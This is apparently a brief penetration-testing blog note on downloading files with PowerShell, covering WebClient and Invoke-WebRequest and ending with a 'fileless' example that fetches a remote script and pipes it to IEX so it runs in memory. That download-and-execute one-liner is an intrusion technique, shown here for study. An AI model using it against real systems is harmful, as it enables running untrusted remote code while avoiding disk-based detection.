---
title: "File Transfers for Penetration Testing"
date: 2024-07-30
---

## The Basics

---

## Windows

### Download Files using Powershell

The esiast way to download files using Powershell is to use the `Net.WebClient` class. This class provides a intuitive way to download HTTP HTTPS and FTP files.

```powershell
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile("http://example.com/file.txt", "C:\path\to\file.txt")
```

Ofcourse, you can also use the `Invoke-WebRequest` cmdlet which is the windows equivalent of `curl` or `wget`. The `DownloadFile` method is used to download a file to a specified location.

```powershell
Invoke-WebRequest -Uri "http://example.com/file.txt" -OutFile "C:\path\to\file.txt"
# or
curl -Uri "http://example.com/file.txt" -OutFile "C:\path\to\file.txt"
# or
wget -Uri "http://example.com/file.txt" -OutFile "C:\path\to\file.txt"
```

### Download Fileless using Powershell

In very rare cases, you may need to download a file without writing it to disk. This can be done using the `Net.WebClient` class and the `DownloadString` method. The IEX command can be used to execute the downloaded script.

```powershell
$webClient = New-Object System.Net.WebClient
$webClient.DownloadString("http://example.com/file.txt") | IEX
```

---

{{< comments >}}
